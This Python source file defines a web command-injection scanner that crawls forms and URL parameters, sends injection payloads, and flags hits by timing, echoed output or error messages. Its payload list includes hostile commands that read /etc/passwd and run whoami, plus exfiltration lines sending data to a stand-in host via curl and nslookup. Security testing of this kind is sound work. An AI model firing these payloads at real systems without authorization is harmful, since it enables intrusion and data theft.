import requests
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import re
import time

class CMDIScanner:
    def __init__(self, url, args):
        self.url = url
        self.args = args
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
        })
        
        if args.proxy:
            self.session.proxies = {'http': args.proxy, 'https': args.proxy}
        if args.cookies:
            for cookie in args.cookies.split(';'):
                if '=' in cookie:
                    key, val = cookie.strip().split('=', 1)
                    self.session.cookies[key] = val
        if args.headers:
            for header in args.headers.split('|'):
                if ':' in header:
                    key, val = header.split(':', 1)
                    self.session.headers[key.strip()] = val.strip()
        
        self.payloads = self.load_payloads()
        self.results = []
    
    def load_payloads(self):
        """Load command injection payloads"""
        payload_file = 'payloads/cmdi.txt'
        try:
            with open(payload_file, 'r') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except FileNotFoundError:
            return [
                # Basic command injection
                "; ls",
                "| ls",
                "|| ls",
                "& ls",
                "&& ls",
                "` ls`",
                "$(ls)",
                # Time-based (for blind detection)
                "; sleep 5",
                "| sleep 5",
                "`sleep 5`",
                "$(sleep 5)",
                # Output extraction
                "; cat /etc/passwd",
                "| whoami",
                "| id",
                # Windows-specific
                "| dir",
                "& whoami",
                "& ver",
                # Bypass attempts
                "|%20ls",
                "|ls",
                ";ls%20-la",
                "| (ls)",
                "; echo INJECTED",
                "| echo INJECTED",
                # DNS-based exfiltration (requires listener)
                "; nslookup attacker.com",
                "| curl http://attacker.com/$(whoami)",
            ]
    
    def extract_forms_and_params(self, html, base_url):
        """Extract forms and URL parameters"""
        soup = BeautifulSoup(html, 'html.parser')
        targets = []
        
        # Forms
        for form in soup.find_all('form'):
            action = form.get('action', '')
            action = urljoin(base_url, action) if action else base_url
            method = form.get('method', 'get').lower()
            
            for input_tag in form.find_all(['input', 'textarea']):
                name = input_tag.get('name')
                if name and input_tag.get('type', 'text') not in ['submit', 'button', 'image']:
                    targets.append({
                        'url': action,
                        'param': name,
                        'method': method,
                        'type': 'form'
                    })
        
        # URL parameters
        parsed = urlparse(base_url)
        if parsed.query:
            for param in parsed.query.split('&'):
                if '=' in param:
                    key = param.split('=')[0]
                    targets.append({
                        'url': base_url,
                        'param': key,
                        'method': 'get',
                        'type': 'url_param'
                    })
        
        return targets
    
    def test_blind_cmdi(self, url, param, payload, method='get'):
        """Test for blind command injection using time-based detection"""
        try:
            start_time = time.time()
            
            data = {param: payload}
            if method == 'post':
                response = self.session.post(url, data=data, timeout=self.args.timeout + 5)
            else:
                response = self.session.get(url, params=data, timeout=self.args.timeout + 5)
            
            elapsed = time.time() - start_time
            
            # If sleep payload and response took > 4 seconds, likely vulnerable
            if 'sleep' in payload.lower() and elapsed > 4:
                return {
                    'url': url,
                    'param': param,
                    'payload': payload,
                    'technique': 'Time-based blind',
                    'evidence': f'Response time: {elapsed:.2f}s',
                    'confidence': 'High'
                }
            
            # Check for command output in response
            if 'INJECTED' in payload:
                if 'INJECTED' in response.text:
                    return {
                        'url': url,
                        'param': param,
                        'payload': payload,
                        'technique': 'Reflected output',
                        'evidence': 'Payload echoed in response',
                        'confidence': 'High'
                    }
            
            # Check for /etc/passwd content
            if 'root:' in response.text and '/bin/bash' in response.text:
                return {
                    'url': url,
                    'param': param,
                    'payload': payload,
                    'technique': 'File read via CMDi',
                    'evidence': '/etc/passwd contents detected',
                    'confidence': 'Critical'
                }
            
            # Check for whoami output
            if response.text and ('uid=' in response.text or 'nt authority' in response.text.lower()):
                return {
                    'url': url,
                    'param': param,
                    'payload': payload,
                    'technique': 'Command execution',
                    'evidence': 'id/whoami output detected',
                    'confidence': 'Critical'
                }
                
        except requests.Timeout:
            if 'sleep' in payload.lower():
                return {
                    'url': url,
                    'param': param,
                    'payload': payload,
                    'technique': 'Time-based blind (timeout)',
                    'evidence': 'Request timed out',
                    'confidence': 'Medium'
                }
        except Exception:
            pass
        
        return None
    
    def test_error_based_cmdi(self, url, param, payload, method='get'):
        """Test for command injection via error messages"""
        try:
            data = {param: payload}
            if method == 'post':
                response = self.session.post(url, data=data, timeout=self.args.timeout)
            else:
                response = self.session.get(url, params=data, timeout=self.args.timeout)
            
            # Look for system error messages
            error_patterns = [
                r'sh:\s+\w+:\s+not found',
                r'bash:\s+\w+:\s+command not found',
                r'\[\w+@\w+\s+\w+\]\$',
                r'No such file or directory',
                r'Permission denied',
                r'usage:\s+',
                r'Warning:\s+',
                r'Cannot find',
                r'./\w+:\s+',
                r'stderr',
                r'stdout'
            ]
            
            for pattern in error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return {
                        'url': url,
                        'param': param,
                        'payload': payload,
                        'technique': 'Error-based CMDi',
                        'evidence': f'Error message detected: {pattern[:40]}',
                        'confidence': 'Medium'
                    }
        except Exception:
            pass
        return None
    
    def scan(self):
        """Main command injection scan"""
        print("    [*] Crawling for input vectors...")
        
        try:
            response = self.session.get(self.url, timeout=self.args.timeout)
        except Exception as e:
            print(f"    [!] Error fetching target: {e}")
            return []
        
        targets = self.extract_forms_and_params(response.text, self.url)
        
        if not targets:
            print("    [!] No input vectors found")
            return []
        
        print(f"    [*] Found {len(targets)} input vectors")
        print(f"    [*] Testing {len(self.payloads)} payloads...")
        
        # Test each target with each payload
        for target in targets:
            for payload in self.payloads:
                # Try blind/time-based test first
                result = self.test_blind_cmdi(
                    target['url'], target['param'], payload, target['method']
                )
                if result:
                    self.results.append(result)
                    print(f"    [!] CMDi Found! ({result['confidence']}) - {target['url'][:60]}")
                    break  # Found one for this param, move on
                
                # Try error-based test
                result = self.test_error_based_cmdi(
                    target['url'], target['param'], payload, target['method']
                )
                if result:
                    self.results.append(result)
                    print(f"    [!] CMDi Found! ({result['confidence']}) - {target['url'][:60]}")
                    break
        
        return self.results